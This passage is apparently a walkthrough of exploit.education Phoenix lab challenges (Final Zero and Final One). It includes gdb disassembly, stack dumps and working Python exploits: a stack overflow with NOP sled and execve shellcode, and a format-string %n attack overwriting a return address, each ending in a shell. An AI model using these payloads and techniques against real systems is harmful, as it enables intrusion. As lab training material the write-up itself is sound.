user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/final-zero 
(gdb) disas get_username
Dump of assembler code for function get_username:
   0x00000000004007cd <+0>:     push   rbp
   0x00000000004007ce <+1>:     mov    rbp,rsp
   0x00000000004007d1 <+4>:     push   rbx
   0x00000000004007d2 <+5>:     sub    rsp,0x218
   0x00000000004007d9 <+12>:    lea    rax,[rbp-0x220]
   0x00000000004007e0 <+19>:    mov    edx,0x200
   0x00000000004007e5 <+24>:    mov    esi,0x0
   0x00000000004007ea <+29>:    mov    rdi,rax
   0x00000000004007ed <+32>:    call   0x400610 <memset@plt>
   0x00000000004007f2 <+37>:    lea    rax,[rbp-0x220]
   0x00000000004007f9 <+44>:    mov    rdi,rax
   0x00000000004007fc <+47>:    call   0x4005d0 <gets@plt>
   0x0000000000400801 <+52>:    lea    rax,[rbp-0x220]
   0x0000000000400808 <+59>:    mov    esi,0xa
   0x000000000040080d <+64>:    mov    rdi,rax
   0x0000000000400810 <+67>:    call   0x400650 <strchr@plt>
   0x0000000000400815 <+72>:    mov    QWORD PTR [rbp-0x20],rax
   0x0000000000400819 <+76>:    cmp    QWORD PTR [rbp-0x20],0x0
   0x000000000040081e <+81>:    je     0x400827 <get_username+90>
   0x0000000000400820 <+83>:    mov    rax,QWORD PTR [rbp-0x20]
   0x0000000000400824 <+87>:    mov    BYTE PTR [rax],0x0
   0x0000000000400827 <+90>:    lea    rax,[rbp-0x220]
   0x000000000040082e <+97>:    mov    esi,0xd
   0x0000000000400833 <+102>:   mov    rdi,rax
   0x0000000000400836 <+105>:   call   0x400650 <strchr@plt>
   0x000000000040083b <+110>:   mov    QWORD PTR [rbp-0x20],rax
   0x000000000040083f <+114>:   cmp    QWORD PTR [rbp-0x20],0x0
   0x0000000000400844 <+119>:   je     0x40084d <get_username+128>
   0x0000000000400846 <+121>:   mov    rax,QWORD PTR [rbp-0x20]
   0x000000000040084a <+125>:   mov    BYTE PTR [rax],0x0
   0x000000000040084d <+128>:   mov    DWORD PTR [rbp-0x14],0x0
   0x0000000000400854 <+135>:   jmp    0x40087f <get_username+178>
   0x0000000000400856 <+137>:   mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000400859 <+140>:   cdqe   
   0x000000000040085b <+142>:   movzx  eax,BYTE PTR [rbp+rax*1-0x220]
   0x0000000000400863 <+150>:   movsx  eax,al
   0x0000000000400866 <+153>:   mov    edi,eax
   0x0000000000400868 <+155>:   call   0x400640 <toupper@plt>
   0x000000000040086d <+160>:   mov    edx,eax
   0x000000000040086f <+162>:   mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000400872 <+165>:   cdqe   
   0x0000000000400874 <+167>:   mov    BYTE PTR [rbp+rax*1-0x220],dl
   0x000000000040087b <+174>:   add    DWORD PTR [rbp-0x14],0x1
   0x000000000040087f <+178>:   mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000400882 <+181>:   movsxd rbx,eax
   0x0000000000400885 <+184>:   lea    rax,[rbp-0x220]
   0x000000000040088c <+191>:   mov    rdi,rax
   0x000000000040088f <+194>:   call   0x400630 <strlen@plt>
   0x0000000000400894 <+199>:   cmp    rbx,rax
   0x0000000000400897 <+202>:   jb     0x400856 <get_username+137>
   0x0000000000400899 <+204>:   lea    rax,[rbp-0x220]
   0x00000000004008a0 <+211>:   mov    rdi,rax
   0x00000000004008a3 <+214>:   call   0x400600 <strdup@plt>
   0x00000000004008a8 <+219>:   add    rsp,0x218
   0x00000000004008af <+226>:   pop    rbx
   0x00000000004008b0 <+227>:   pop    rbp
   0x00000000004008b1 <+228>:   ret    
End of assembler dump.
```

Now we can write a python script that inputs a ton of As. But before giving the program the input the python script will sleep for 30 seconds giving us time to get a breakpoint on the program setup. We can have one terminal running the python script.

```python
import socket
import time 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 64003
s.connect((host,port))

print(s.recv(1024))

time.sleep(30)
s.send("A"*500 + "\n")

print(s.recv(1024))
s.close()
```
```bash
user@phoenix-amd64:~$ python final-zero.py 
Welcome to phoenix/final-zero, brought to you by https://exploit.education

```

While on the other terminal we are setting a breakpoint in the get_username function using gdb to hook into the running process. We use the ps command to get all the running processes and grep to find the final-zero program running. We then get the process id, 5219, and use that to have gdb hook into it and debug it. We set up the breakpoint where we wanted and continue to wait for the python script to enter in the input. Now we look at the rsp, but offset by 600 because of the buffer size to see where our As are located. We can see the address of the stack where the As are in, so we just need to pick a location to point the rip to. 0x7fffffffeaa8 seems like a good location now we need to find how many bytes to put in the buffer to overwrite the rip. We can write another script for that. 

```bash
user@phoenix-amd64:~$ ps aux | grep final
user      5218  4.0  0.8  31560  8804 pts/0    S+   00:34   0:00 python final-zero.py
phoenix+  5219  1.5  0.0    752     4 ?        Ss   00:34   0:00 /opt/phoenix/amd64/final-zero
user      5221  0.0  0.0  11112   936 pts/1    S+   00:34   0:00 grep final
user@phoenix-amd64:~$ sudo gdb -p 5219
[sudo] password for user: 
(gdb) break *0x00000000004008b0
Breakpoint 1 at 0x4008b0
(gdb) c
Continuing.

Breakpoint 1, 0x00000000004008b0 in get_username ()
(gdb) x/200wx $rsp-600
0x7fffffffea28: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffea38: 0xf7d860ea      0x00007fff      0x0000000d      0x00000000
0x7fffffffea48: 0x000001f4      0x00000000      0xffffec80      0x00007fff
0x7fffffffea58: 0x004008a8      0x00000000      0x41414141      0x41414141
0x7fffffffea68: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffea78: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffea88: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffea98: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeaa8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeab8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeac8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffead8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeae8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeaf8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeb08: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeb18: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeb28: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeb38: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeb48: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeb58: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeb68: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeb78: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeb88: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeb98: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffeba8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffebb8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffebc8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffebd8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffebe8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffebf8: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffec08: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffec18: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffec28: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffec38: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffec48: 0x41414141      0x41414141      0x41414141      0x00000000
0x7fffffffec58: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffec68: 0xf7db9934      0x000001f4      0xffffed18      0x00007fff
0x7fffffffec78: 0xffffed18      0x00007fff      0xffffecc0      0x00007fff
0x7fffffffec88: 0x004008e8      0x00000000      0x00000000      0x00000000
0x7fffffffec98: 0xffffed28      0x00007fff      0xffffed18      0x00007fff
0x7fffffffeca8: 0xffffed28      0x00000001      0x004008b2      0x00000000
0x7fffffffecb8: 0x00000000      0x00000000      0x00000001      0x00000000
0x7fffffffecc8: 0xf7d8fd62      0x00007fff      0x00000000      0x00000000
0x7fffffffecd8: 0xffffed10      0x00007fff      0x00000000      0x00000000
0x7fffffffece8: 0xf7ffdbc8      0x00007fff      0x00003e00      0x04000001
0x7fffffffecf8: 0x00400699      0x00000000      0x00000000      0x00000000
0x7fffffffed08: 0x00400676      0x00000000      0x00000001      0x00000000
0x7fffffffed18: 0xffffeec1      0x00007fff      0x00000000      0x00000000
0x7fffffffed28: 0xffffeedf      0x00007fff      0xffffef21      0x00007fff
0x7fffffffed38: 0xffffef37      0x00007fff      0xffffef49      0x00007fff
```

The new script only adds more As and the rest of the alphabet at the end of the string. This way we can see what letters the rip is trying to call. We setup the gdb session again then see that gdb was trying to call, 5554535251504f4e or TSRQPON, at the return call. So we now know to put the stack address we want after M. We then just need to create another python script with the shell code from challenge 6, stack address we want to return to, and a ton of NOPs to pad the buffer with. The only thing we need know is a way to input commands into the shell and receive the outputs to those commands. The best way is setting up a telnet connection with the command shell using the telnet python library. Creating a script with all that solves the challenge.


```python
import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 64003
s.connect((host,port))

print(s.recv(1024))

time.sleep(30)
s.send("A"*540 + "BCDEFGHIJKLMNOPQRSTUVWXYZ" + "\n")

print(s.recv(1024))
s.close()
```

```bash
user@phoenix-amd64:~$ ps aux | grep final
user      5308  3.0  0.8  31560  8804 pts/0    S+   00:46   0:00 python final-zero.py
phoenix+  5309  1.0  0.0    752     4 ?        Ss   00:46   0:00 /opt/phoenix/amd64/final-zero
user      5332  0.0  0.0  11112   936 pts/1    S+   00:46   0:00 grep final
user@phoenix-amd64:~$ sudo gdb -p 5309
(gdb) break *0x00000000004008b0
Breakpoint 1 at 0x4008b0
(gdb) c       
Continuing.

Breakpoint 1, 0x00000000004008b0 in get_username ()
(gdb) info reg
rax            0x600d00            0x600d00
rbx            0x4544434241414141  0x4544434241414141
rcx            0x0                 0x0
rdx            0x0                 0x0
rsi            0x7fffffffec61      0x7fffffffec61
rdi            0x600f01            0x600f01
rbp            0x7fffffffec80      0x7fffffffec80
rsp            0x7fffffffec80      0x7fffffffec80
r8             0x17                0x17
r9             0x8080808080808080  0x8080808080808080
r10            0x8080808080808080  0x8080808080808080
r11            0x6                 0x6
r12            0x7fffffffed28      0x7fffffffed28
r13            0x4008b2            0x4008b2
r14            0x0                 0x0
r15            0x0                 0x0
rip            0x4008b0            0x4008b0 <get_username+227>
eflags         0x206               [ PF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
(gdb) si
0x00000000004008b1 in get_username ()
(gdb) info reg
rax            0x600d00            0x600d00
rbx            0x4544434241414141  0x4544434241414141
rcx            0x0                 0x0
rdx            0x0                 0x0
rsi            0x7fffffffec61      0x7fffffffec61
rdi            0x600f01            0x600f01
rbp            0x4d4c4b4a49484746  0x4d4c4b4a49484746
rsp            0x7fffffffec88      0x7fffffffec88
r8             0x17                0x17
r9             0x8080808080808080  0x8080808080808080
r10            0x8080808080808080  0x8080808080808080
r11            0x6                 0x6
r12            0x7fffffffed28      0x7fffffffed28
r13            0x4008b2            0x4008b2
r14            0x0                 0x0
r15            0x0                 0x0
rip            0x4008b1            0x4008b1 <get_username+228>
eflags         0x206               [ PF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
(gdb) si
0x5554535251504f4e in ?? ()
(gdb) info reg
rax            0x600d00            0x600d00
rbx            0x4544434241414141  0x4544434241414141
rcx            0x0                 0x0
rdx            0x0                 0x0
rsi            0x7fffffffec61      0x7fffffffec61
rdi            0x600f01            0x600f01
rbp            0x4d4c4b4a49484746  0x4d4c4b4a49484746
rsp            0x7fffffffec90      0x7fffffffec90
r8             0x17                0x17
r9             0x8080808080808080  0x8080808080808080
r10            0x8080808080808080  0x8080808080808080
r11            0x6                 0x6
r12            0x7fffffffed28      0x7fffffffed28
r13            0x4008b2            0x4008b2
r14            0x0                 0x0
r15            0x0                 0x0
rip            0x5554535251504f4e  0x5554535251504f4e
eflags         0x206               [ PF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
```

### Solved

```python
import socket
import telnetlib

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 64003
s.connect((host,port))

print(s.recv(1024))

shell = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
nop = b'\x90'*350
rip = b'\xa8\xea\xff\xff\xff\x7f'
padding = "A"*(540-(len(shell)+len(nop)))
s.send(nop + shell + padding + "BCDEFGHIJKLM" + rip + "\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
print(s.recv(1024))
s.close()
```

```bash
user@phoenix-amd64:~$ python final-zero.py 
Welcome to phoenix/final-zero, brought to you by https://exploit.education

whoami
phoenix-amd64-final-zero
```

## Challenge 21 - Final One

[Final One Code](https://exploit.education/phoenix/final-one/).

For this challenge we are doing a format string exploit over socket. But to start out we can test things on the program itself by giving the program the command argument "-test". The program gives us a prompt and is waiting for us to give is either "username" with something after it, or "login" with something after it. If we give the program a username with As and "%x"s, then try to login. We can see that we do have a format exploit. We can see that the As show up after 10 "%x"s. We now know where we can edit the stack at now to decide what to put on the stack.

```bash
user@phoenix-amd64:~$ /opt/phoenix/i486/final-one --test
Welcome to phoenix/final-one, brought to you by https://exploit.education
user@phoenix-amd64:~$ /opt/phoenix/amd64/final-one --test
Welcome to phoenix/final-one, brought to you by https://exploit.education
[final1] $ username AAAAAAAAAAAAAAAAAA
[final1] $ login %x %x %x %x %x %x %x %x %x %x %x %x 
Login from testing:12121 as [AAAAAAAAAAAAAAAAAA] with password [ffffddd0 0 2000 23 0 ffffe5e6 69676f4c 74206d6f 313a676e 20736120 41414141 41414141]
login failed
```

We need gdb to disassemble the logit function, so we know where to put breakpoints to later.

```bash
(gdb) disas logit
Dump of assembler code for function logit:
   0x080487e5 <+0>:     push   ebp
   0x080487e6 <+1>:     mov    ebp,esp
   0x080487e8 <+3>:     sub    esp,0x808
   0x080487ee <+9>:     sub    esp,0x8
   0x080487f1 <+12>:    push   DWORD PTR [ebp+0x8]
   0x080487f4 <+15>:    push   0x8049ee0
   0x080487f9 <+20>:    push   0x8049f80
   0x080487fe <+25>:    push   0x8048b40
   0x08048803 <+30>:    push   0x800
   0x08048808 <+35>:    lea    eax,[ebp-0x808]
   0x0804880e <+41>:    push   eax
   0x0804880f <+42>:    call   0x8048560 <snprintf@plt>
   0x08048814 <+47>:    add    esp,0x20
   0x08048817 <+50>:    mov    eax,ds:0x8049f60
   0x0804881c <+55>:    sub    esp,0x8
   0x0804881f <+58>:    lea    edx,[ebp-0x808]
   0x08048825 <+64>:    push   edx
   0x08048826 <+65>:    push   eax
   0x08048827 <+66>:    call   0x80485a0 <fprintf@plt>
   0x0804882c <+71>:    add    esp,0x10
   0x0804882f <+74>:    nop
   0x08048830 <+75>:    leave  
   0x08048831 <+76>:    ret    
End of assembler dump.
```

We can create a python script that gives waits for input, before sending data to the program. So, we can setup gdb to use it to find where the logit function looks to on the stack to return back to parser function. We can change the value in that address to a place in the stack we control. We find that the address the logit looks to is 0xffffdc9c. 

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 64014
s.connect((host,port))

print(s.recv(1024))

send = "username A\n"
send = send + "login n\n"

raw_input("[enter]")
s.send(send)

print(s.recv(1024))
s.close()
```

```bash
user@phoenix-amd64:~$ ps aux | grep final
user      6260  0.1  0.8  31560  8800 pts/0    S+   03:30   0:00 python final-one.py
phoenix+  6261  0.0  0.0    736     4 ?        Ss   03:30   0:00 /opt/phoenix/i486/final-one
user      6271  0.0  0.0  11112   936 pts/1    S+   03:31   0:00 grep final
user@phoenix-amd64:~$ sudo gdb -p 6261 
(gdb) break *0x08048831
Breakpoint 1 at 0x8048831
(gdb) c
Continuing.

Breakpoint 1, 0x08048831 in logit ()
(gdb) info frame
Stack level 0, frame at 0xffffdca0:
 eip = 0x8048831 in logit; saved eip = 0x804892c
 called by frame at 0xffffdd40
 Arglist at 0xffffdd38, args: 
 Locals at 0xffffdd38, Previous frame's sp is 0xffffdca0
 Saved registers:
  eip at 0xffffdc9c
```

We start creating a python script that gets us a shell command. we need to add each section of the return address to the stack for us to manipulate. We are adding a spacing of As in between the return address sections, so we can use "%x" to pad the string to the number we need without adding to the string size because of the buffer limit. We can add the shellcode from [here](http://shell-storm.org/shellcode/files/shellcode-841.php). We then add the "%n"s to manipulate all of the return address. After running the script we can see that we did indeed manipulated the return address. We now know the size of our input string is 9f, so we need that to know how much spaces to buffer the input with. We can also check the stack to see where our shellcode is, so we can change the return address to there. We find that address, 0xffffd4cc, is where we need to go. The last thing we need to do to solve this challenge is to add the number of padding we need for each manipulation of the return address, and to add a telnet connection. Figuring out the numbers is just doing simple subtraction like we did in challenge 11, Format Three, then checking the process on gdb by hooking into the running process like below. After getting all the numbers right the challenge is solved.

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 64014
s.connect((host,port))

print(s.recv(1024))

send = "username A"
printf1 = b'\x9c\xdc\xff\xff'
printf2 = b'\x9d\xdc\xff\xff'
printf3 = b'\x9e\xdc\xff\xff'
printf4 = b'\x9f\xdc\xff\xff'
shell = b'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

send = send + printf1 + "AAAA"  + printf2 + "AAAA" + printf3 + "AAAA"  + printf4 + shell
send = send + "\nlogin " + '%x' * 9
send = send + '%x' + '%n' + '%x' + '%n' + '%x' + '%n' + '%x' + '%n' + '\n'

raw_input("[enter]")
s.send(send)

print(s.recv(1024))
s.close()
```

```bash
user@phoenix-amd64:~$ ps aux | grep final
user      8114  0.1  0.8  31560  8800 pts/0    S+   05:41   0:00 python final-one.py
phoenix+  8115  0.3  0.0    736     4 ?        Ss   05:41   0:00 /opt/phoenix/i486/final-one
user      8137  0.0  0.0  11112   936 pts/1    S+   05:41   0:00 grep final
user@phoenix-amd64:~$ sudo gdb -p 8115
[sudo] password for user: 
(gdb) break *0x08048831
Breakpoint 1 at 0x8048831
(gdb) c
Continuing.

Breakpoint 1, 0x08048831 in logit ()
(gdb) x 0xffffdc9c
0xffffdc9c:     0xbcb4aca4
(gdb) x/100wx $esp-2200
0xffffd404:     0xffffffff      0x00000000      0xffffd3b0      0x00000000
0xffffd414:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd424:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd434:     0x00000000      0x00000000      0x00000000      0xf7ffb000
0xffffd444:     0xffffddd4      0xf7fba90b      0xf7ffb000      0xffffddd4
0xffffd454:     0x00000001      0xffffdc98      0xf7fb6f8c      0x08049010
0xffffd464:     0xffffd490      0xffffd488      0xffffd490      0xffffd490
0xffffd474:     0xf7fb6f70      0xf7ffb000      0x0804882c      0x08049010
0xffffd484:     0xffffd490      0x00000000      0x00000000      0x69676f4c
0xffffd494:     0x7266206e      0x31206d6f      0x302e3732      0x312e302e
0xffffd4a4:     0x3434333a      0x61203837      0x415b2073      0xffffdc9c
0xffffd4b4:     0x41414141      0xffffdc9d      0x41414141      0xffffdc9e
0xffffd4c4:     0x41414141      0xffffdc9f      0xe1f7c931      0x68510bb0
0xffffd4d4:     0x68732f2f      0x69622f68      0xcde3896e      0x77205d80
0xffffd4e4:     0x20687469      0x73736170      0x64726f77      0x78255b20
0xffffd4f4:     0x78257825      0x78257825      0x78257825      0x78257825
0xffffd504:     0x6e257825      0x6e257825      0x6e257825      0x6e257825
0xffffd514:     0x00000a5d      0x00000000      0x00000000      0x00000000
0xffffd524:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd534:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd544:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd554:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd564:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd574:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd584:     0x00000000      0x00000000      0x00000000      0x00000000

```

### Solved

```python
import socket
import telnetlib

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 64014
s.connect((host,port))

print(s.recv(1024))

send = "username A"
printf1 = b'\x9c\xdc\xff\xff'
printf2 = b'\x9d\xdc\xff\xff'
printf3 = b'\x9e\xdc\xff\xff'
printf4 = b'\x9f\xdc\xff\xff'
shell = b'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

send = send + printf1 + "AAAA"  + printf2 + "AAAA" + printf3 + "AAAA"  + printf4 + shell
send = send + "\nlogin " + '%x' * 9
send = send + '%048x' + '%n' + '%08x' + '%n' + '%0299x' + '%n' + '%0256x' + '%n' + '\n'

raw_input("[enter]")
s.send(send)

t = telnetlib.Telnet()
t.sock = s
t.interact()
print(s.recv(1024))
s.close()
```

```bash
user@phoenix-amd64:~$ python final-one.py 
Welcome to phoenix/final-one, brought to you by https://exploit.education
[enter]

[final1] $ [final1] $ whoami
phoenix-i386-final-one
```

## Challenge 22 - Final Two


### Solved
